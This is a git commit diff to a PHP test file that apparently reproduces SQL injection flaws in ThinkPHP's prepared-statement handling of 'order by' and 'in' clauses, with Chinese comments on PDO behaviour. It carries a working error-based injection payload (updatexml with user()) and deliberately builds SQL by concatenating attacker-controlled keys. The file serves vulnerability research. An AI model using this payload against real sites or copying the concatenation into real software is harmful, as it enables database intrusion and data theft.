17384c3183866baabc5f419bf7e854869340caec
浮殇 <809105861@qq.com>
2018-09-29 19:49:25 +0800

    Update ThinkTest.php

--- ThinkPHP/ThinkTest.php
+++ ThinkPHP/ThinkTest.php
@@ -8,8 +8,9 @@
 
 class ThinkTest{
     private $options = array('order'=>array('id'));
+    private $bindkey;
 
-    private function order($field,$order = null){
+    private function order($field){
         if(empty($field)) {
             return $this;
         }
@@ -24,17 +25,30 @@ class ThinkTest{
         return $this;
     }
 
-    public function MysqlDb() {
+    private function in($value){
+        if(is_array($value)){
+            foreach($value as $k => $v) {
+                $this->bindkey = ':where' .uniqid() . '_' . $k;
+            }
+        }
+        return $this;
+    }
+    public function MysqlDb($method) {
         $id = 2;
         $order = implode("|",$this->options['order']);
-        var_dump($order);
         //$order = 'id | updatexml(0,concat(0xa,user()),0)';
-        $dbh = new PDO('mysql:dbname=test;host=127.0.0.1;','root','',array(PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING));
+        $dbh = new PDO('mysql:dbname=test;host=127.0.0.1;','root','',array(PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING,PDO::ATTR_EMULATE_PREPARES=>false));
         try {
-            $link = $dbh -> prepare("select * from test where id =:id order by " . $order);
-            $link->bindParam(':id',$id,PDO::PARAM_INT);
-            $link->execute();
-            //var_dump($link);
+            if($method == 'order') {
+                $link = $dbh -> prepare("select * from test where id =:id order by " . $order);
+                $link->bindParam(':id',$id,PDO::PARAM_INT);
+                $link->execute();
+            } else {
+                $link = $dbh -> prepare("SELECT * FROM test WHERE id in (".$this->bindkey.")");
+                var_dump($link);
+                $link->bindParam(':where_id',$this->bindkey,PDO::PARAM_STR);
+                $link->execute();
+            }
             while($row = $link -> fetch(PDO::FETCH_ASSOC)) {
                 var_Dump($row);
             }
@@ -42,18 +56,33 @@ class ThinkTest{
             var_dump($e);
         }
     }
+
     /**
      * ThinkPHP order by 预编译sql语句拼接注入
      * @version 5.1.22
      */
-    public function OrderTest() {
-        //$field = array(' updatexml(0,concat(0xa,user()),0)');
-        $field = $_GET['filed'];
-        $this->order($field);
-        $this->MysqlDb();
 
+    public function OrderTest() {
+        $field = array(' updatexml(0,concat(0xa,user()),0)');
+        //$field = $_GET['ids'];
+        $this->order($field);
+        $this->MysqlDb('order');
+
+    }
+
+    /**
+     * ThinkPHP in 预编译sql语句拼接注入
+     * PDO::ATTR_EMULATE_PREPARES=> false ,参数化绑定过程为：带有占位符sql发送至mysql编译，占位符参数发送至mysql服务器执行。第一步中发生错误将抛出异常终端执行。
+     * @version 5
+     */
+
+    public function InTest(){
+        $value = array("0,updatexml(0,concat(0xa,user()),0)"=>1);
+        $this->in($value);
+        $this->MysqlDb('in');
     }
 }
 
 $a = new ThinkTest();
-$a->OrderTest();
+//$a->OrderTest();
+$a->InTest();
